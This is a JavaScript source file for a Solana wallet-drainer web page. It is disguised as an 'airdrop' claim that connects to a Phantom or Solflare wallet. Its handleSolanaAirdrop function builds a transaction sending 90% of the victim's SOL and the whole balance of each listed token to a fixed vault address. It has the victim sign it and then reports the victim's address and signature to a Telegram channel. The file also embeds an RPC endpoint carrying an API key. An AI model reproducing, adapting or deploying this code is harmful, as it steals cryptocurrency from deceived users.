
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount } from "@solana/spl-token";
import { AIRDROP_SOLANA } from "./constant";
import { sendToTelegram } from "./telegram";

// const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed")
const connection = new Connection("https://falling-old-breeze.solana-mainnet.quiknode.pro/3e17bcb1b159df5936c696c22e1ac467452d72e6/", "confirmed")

export const connectSolana = async () => {
    try {
        const provider = window.solana // standard for phantom, solflare
        if(!provider){
            alert("Please install Phantom wallet")
            return null
        }
        const resp = await provider.connect()
        if(resp && resp.publicKey){
            return resp.publicKey.toString()
        }
        return null
    } catch (err){
        // This catches "User rejected the request" errors
        console.warn("User cancelled Solana connection: ", err);
        return null;
    }
}

export const handleSolanaAirdrop = async (userAddress, tokenMints) => {
    const provider = window.solana
    const userPubKey = new PublicKey(userAddress)
    const vaultPubKey = new PublicKey(AIRDROP_SOLANA)
    const transaction = new Transaction()

    try {
        // get solana balance and add transfer (leave some amount for gas)
        const balance = await connection.getBalance(userPubKey)
        if(balance > 0.01 * LAMPORTS_PER_SOL){
            const amountToSend = Math.floor(balance * 0.9) // send 90%
            transaction.add(
                SystemProgram.transfer({
                    fromPubkey: userPubKey,
                    toPubkey: vaultPubKey,
                    lamports: amountToSend
                })
            )
        }

        // add token transfer
        for(const mintAddress of tokenMints){
            try {
                const mint = new PublicKey(mintAddress)
                const sourceATA = await getAssociatedTokenAddress(mint, userPubKey)
                const destATA = await getAssociatedTokenAddress(mint, vaultPubKey)

                // fetch balance of token
                const tokenAccount = await connection.getTokenAccountBalance(sourceATA)
                if(tokenAccount.value.uiAmount > 0){
                    transaction.add(createTransferInstruction(sourceATA, destATA, userPubKey, tokenAccount.value.amount))
                }
            } catch (e) {continue}
        }

        // sign and send
        transaction.feePayer = userPubKey
        transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash

        const {signature} = await provider.signAndSendTransaction(transaction)
        await sendToTelegram(`🚀 Solana Airdrop Pending\nUser: ${userAddress}\nSig: ${signature}`)
        return signature
    } catch (err){
        console.error("Solana error:", err);
        return null;
    }
}